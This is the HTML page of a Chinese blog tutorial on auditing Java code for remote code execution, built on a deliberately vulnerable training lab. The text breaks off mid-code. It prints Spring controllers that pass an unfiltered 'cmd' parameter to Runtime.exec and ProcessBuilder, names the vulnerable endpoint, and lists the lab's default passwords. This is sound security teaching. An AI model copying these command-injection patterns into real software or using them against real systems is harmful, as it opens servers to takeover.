@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="RCE 简述RCE (Remote Code Execution), 远程代码执行漏洞，这里包含两种类型漏洞:命令注入（Command Injection），在某种开发需求中，需要引入对系统本地命令的支持来完成特定功能，当未对输入做过滤时，则会产生命令注入。代码注入（Code Injection），在正常的java程序中注入一段java代码并执行，即用户输入的数据当作java代码进行执行。 Jav">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java代码审计(二)-远程代码执行">
+<meta property="og:url" content="http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="世间闲客·此闲行">
+<meta property="og:description" content="RCE 简述RCE (Remote Code Execution), 远程代码执行漏洞，这里包含两种类型漏洞:命令注入（Command Injection），在某种开发需求中，需要引入对系统本地命令的支持来完成特定功能，当未对输入做过滤时，则会产生命令注入。代码注入（Code Injection），在正常的java程序中注入一段java代码并执行，即用户输入的数据当作java代码进行执行。 Jav">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220924211209757.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220924211301830.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220924210314888.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220915164044238-16640246936051.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220915164142524.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220915164229589.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220915164400359.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220918141941315.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220918142058897.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220918142354828.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220918142639287.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220918143346281.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220918144021479.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220918144306263.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220918144431283.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220918144521945.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220923103044841.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220923103020225.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220923101155900.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220924200159394.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220924200052768.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220924203259186.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220924212111867.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220924212749312.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220924212459768.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220924212609577.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220923105400989.png">
+<meta property="og:image" content="http://example.com/images/Java/rce/image-20220924205355487.png">
+<meta property="article:published_time" content="2022-09-25T03:15:44.000Z">
+<meta property="article:modified_time" content="2022-10-30T05:56:34.000Z">
+<meta property="article:author" content="Funsiooo">
+<meta property="article:tag" content="Java代码审计">
+<meta property="article:tag" content="远程代码执行">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Java/rce/image-20220924211209757.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo-1.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo-1.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo-1.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java代码审计(二)-远程代码执行</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/10/02/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%89)-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/09/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%80)-SQL%E6%B3%A8%E5%85%A5/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&text=Java代码审计(二)-远程代码执行"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&title=Java代码审计(二)-远程代码执行"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&is_video=false&description=Java代码审计(二)-远程代码执行"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java代码审计(二)-远程代码执行&body=Check out this article: http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&title=Java代码审计(二)-远程代码执行"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&title=Java代码审计(二)-远程代码执行"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&title=Java代码审计(二)-远程代码执行"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&title=Java代码审计(二)-远程代码执行"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&name=Java代码审计(二)-远程代码执行&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&t=Java代码审计(二)-远程代码执行"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-%E7%AE%80%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">RCE 简述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">Java 命令执行函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">靶场搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80"><span class="toc-number">3.1.</span> <span class="toc-text">一、项目地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">3.2.</span> <span class="toc-text">二、环境配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0"><span class="toc-number">4.</span> <span class="toc-text">漏洞学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81Runtime-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.1.</span> <span class="toc-text">一、Runtime 命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81ProcessBuilder-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.2.</span> <span class="toc-text">二、ProcessBuilder 命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81ScriptEngine-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-jscmd"><span class="toc-number">4.3.</span> <span class="toc-text">三、ScriptEngine 命令执行(jscmd)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81yml%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.4.</span> <span class="toc-text">四、yml命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81Groovy"><span class="toc-number">4.5.</span> <span class="toc-text">五、Groovy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%85%B6%E4%BB%96"><span class="toc-number">4.6.</span> <span class="toc-text">六、其他</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">参考文章：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Java代码审计(二)-远程代码执行
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Funsiooo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-09-25T03:15:44.000Z" itemprop="datePublished">2022-09-25</time>
+        
+        (Updated: <time datetime="2022-10-30T05:56:34.000Z" itemprop="dateModified">2022-10-30</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">Java代码审计</a>, <a class="tag-link-link" href="/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" rel="tag">远程代码执行</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="RCE-简述"><a href="#RCE-简述" class="headerlink" title="RCE 简述"></a>RCE 简述</h2><p>RCE (Remote Code Execution), 远程代码执行漏洞，这里包含两种类型漏洞:<code>命令注入（Command Injection）</code>，在某种开发需求中，需要引入对系统本地命令的支持来完成特定功能，当未对输入做过滤时，则会产生命令注入。<code>代码注入（Code Injection）</code>，在正常的java程序中注入一段java代码并执行，即用户输入的数据当作java代码进行执行。</p>
+<h2 id="Java-命令执行函数"><a href="#Java-命令执行函数" class="headerlink" title="Java 命令执行函数"></a>Java 命令执行函数</h2><p>Java 命令执行函数相对 PHP 来说，能够进行命令执行的函数并不多，只有两个 <code>Runtime</code> ,<code>ProcessBuilder</code>，其他方法也能进行命令执行，本文主要介绍如下：</p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+| 函数/其他              | 作用                                             |
+| --------------------- | --------------------------------------------     |
+| Runtime               | 命令执行                                          |
+| ProcessBuilder        | 命令执行                                          |
+| ScriptEbgine（JScmd） | 加载远程 js 文件来执行命令                          |
+| yml                   | 利用 SnakeYAML 将 yaml 文件解析 yml，进行命令执行   |
+| groovy                | 不安全使用 groovy 导致命令执行                     |
+</pre>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+<br/>
+
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><h3 id="一、项目地址"><a href="#一、项目地址" class="headerlink" title="一、项目地址"></a>一、项目地址</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/JoyChou93/java-sec-code</span><br></pre></td></tr></table></figure></div>
+
+
+<br/>
+
+<h3 id="二、环境配置"><a href="#二、环境配置" class="headerlink" title="二、环境配置"></a>二、环境配置</h3><p>1、导入源码中的 sql 文件至 Mysql 数据库。</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924211209757.png" data-caption="image-20220924211209757"><img src="/../images/Java/rce/image-20220924211209757.png" alt="image-20220924211209757"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924211301830.png" data-caption="image-20220924211301830"><img src="/../images/Java/rce/image-20220924211301830.png" alt="image-20220924211301830"></a></p>
+<p>2、修改源码数据库 root 密码</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924210314888.png" data-caption="image-20220924210314888"><img src="/../images/Java/rce/image-20220924210314888.png" alt="image-20220924210314888"></a></p>
+<p>3、编译项目</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220915164044238-16640246936051.png" data-caption="image-20220915164044238"><img src="/../images/Java/rce/image-20220915164044238-16640246936051.png" alt="image-20220915164044238"></a></p>
+<p>右键run，成功启动项目</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220915164142524.png" data-caption="image-20220915164142524"><img src="/../images/Java/rce/image-20220915164142524.png" alt="image-20220915164142524"></a></p>
+<p>成功搭建，账号密码：admin&#x2F;admin123、joychou&#x2F;joychou123</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220915164229589.png" data-caption="image-20220915164229589"><img src="/../images/Java/rce/image-20220915164229589.png" alt="image-20220915164229589"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220915164400359.png" data-caption="image-20220915164400359"><img src="/../images/Java/rce/image-20220915164400359.png" alt="image-20220915164400359"></a></p>
+<p>若前期环境没有搭建，请参考上一篇文章。</p>
+<h2 id="漏洞学习"><a href="#漏洞学习" class="headerlink" title="漏洞学习"></a>漏洞学习</h2><h3 id="一、Runtime-命令执行"><a href="#一、Runtime-命令执行" class="headerlink" title="一、Runtime 命令执行"></a>一、Runtime 命令执行</h3><p>Runtime 类封装了运行时的环境，每个 Java 应用程序都有一个 Runtime 类实例，使应用程序能够与其运行的环境相连接。一般不能实例化一个 Runtime 对象，应用程序也不能创建自己的 Runtime 类实例，但可以通过 getRuntime 方法获取当前 Runtime 运行时对象的引用。当 Runtime 的对象被引用，就可以调用 Runtime 对象的方法去控制 Java 虚拟机的状态和行为。 </p>
+<p>漏洞分析，具体漏洞代码如下:</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/rce&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rce</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/runtime/exec&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">CommandExec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">run</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> run.exec(cmd);</span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                sb.append(tmpStr);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p.waitFor() != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (p.exitValue() == <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Command exec failed!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            inBr.close();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>IDEA调试分析，定位漏洞代码，利用IDEA全局搜索，定位危险函数 <code>右键目录 -》 Find in files</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918141941315.png" data-caption="image-20220918141941315"><img src="/../images/Java/rce/image-20220918141941315.png" alt="image-20220918141941315"></a></p>
+<p>搜索 <code>runtime</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918142058897.png" data-caption="image-20220918142058897"><img src="/../images/Java/rce/image-20220918142058897.png" alt="image-20220918142058897"></a></p>
+<p>当多处存在则需要进一步分析,定位到 <code>runtime</code> 危险函数文件为 <code>Rce.java</code> , 初步分析其代码，没有发现进行过滤处理</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918142354828.png" data-caption="image-20220918142354828"><img src="/../images/Java/rce/image-20220918142354828.png" alt="image-20220918142354828"></a></p>
+<p>跟进 <code>getRuntime()</code> 方法，<code>Ctrl + 鼠标左键</code> 点击 <code>getRuntime</code>， 代码没有进行任何过滤，直接返回 <code>currentRuntime</code> 对象， 由下图可知，<code>currentRuntime</code> 为类 <code>Runtime</code> 的实例对象。也就是说，每次调用 <code>getRuntime()</code> 方法都会由类 <code>Runtime</code> 产生一个新的实例对象 <code>new Runtime()</code>。</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918142639287.png" data-caption="image-20220918142639287"><img src="/../images/Java/rce/image-20220918142639287.png" alt="image-20220918142639287"></a></p>
+<p>代码即可分析为,当调用了 <code>getRuntime()</code> 产生了一个新的 <code>Runtime</code> 对象后，再进行下一步执行 <code>run.exec()</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918143346281.png" data-caption="image-20220918143346281"><img src="/../images/Java/rce/image-20220918143346281.png" alt="image-20220918143346281"></a></p>
+<p>跟进 <code>exec</code> 方法， <code>Ctrl + 鼠标左键</code>点击 <code>exec</code> ,通过实例化了 <code>Runtime.getRuntime()</code> ,利用 <code>exec</code> 去执行传入的参数。</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918144021479.png" data-caption="image-20220918144021479"><img src="/../images/Java/rce/image-20220918144021479.png" alt="image-20220918144021479"></a></p>
+<p>漏洞复现，定位漏洞路径，按自上到下的方法初步定位路径 <code>/rce/runtime/exec?cmd</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918144306263.png" data-caption="image-20220918144306263"><img src="/../images/Java/rce/image-20220918144306263.png" alt="image-20220918144306263"></a></p>
+<p>成功复现</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918144431283.png" data-caption="image-20220918144431283"><img src="/../images/Java/rce/image-20220918144431283.png" alt="image-20220918144431283"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918144521945.png" data-caption="image-20220918144521945"><img src="/../images/Java/rce/image-20220918144521945.png" alt="image-20220918144521945"></a></p>
+<p>小结：通过全局搜索 Runtime ,定位是否存在危险函数，然后查看其代码是否采取了过滤机制，再跟进代码分析其执行方法，最后定位漏洞路径进行漏洞复现。</p>
+<br/>
+
+<h3 id="二、ProcessBuilder-命令执行"><a href="#二、ProcessBuilder-命令执行" class="headerlink" title="二、ProcessBuilder 命令执行"></a>二、ProcessBuilder 命令执行</h3><p><code>ProcessBuilder</code> 类通过创建系统进程执行命令,每个 <code>ProcessBuilder</code> 实例管理一个进程的属性，<code>start()</code> 方法使用这些属性创建一个新的 <code>Process</code> 实例。可以从同一实例重复调用<code>start()</code> 方法以创建具有相同或相关属性的新子进程。</p>
+<p>漏洞分析，具体漏洞代码如下：</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/ProcessBuilder&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">processBuilder</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// String[] arrCmd = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;; //Linux</span></span><br><span class="line">        String[] arrCmd = &#123;cmd&#125;;  <span class="comment">//Windows</span></span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(arrCmd);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        String tmpStr;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) 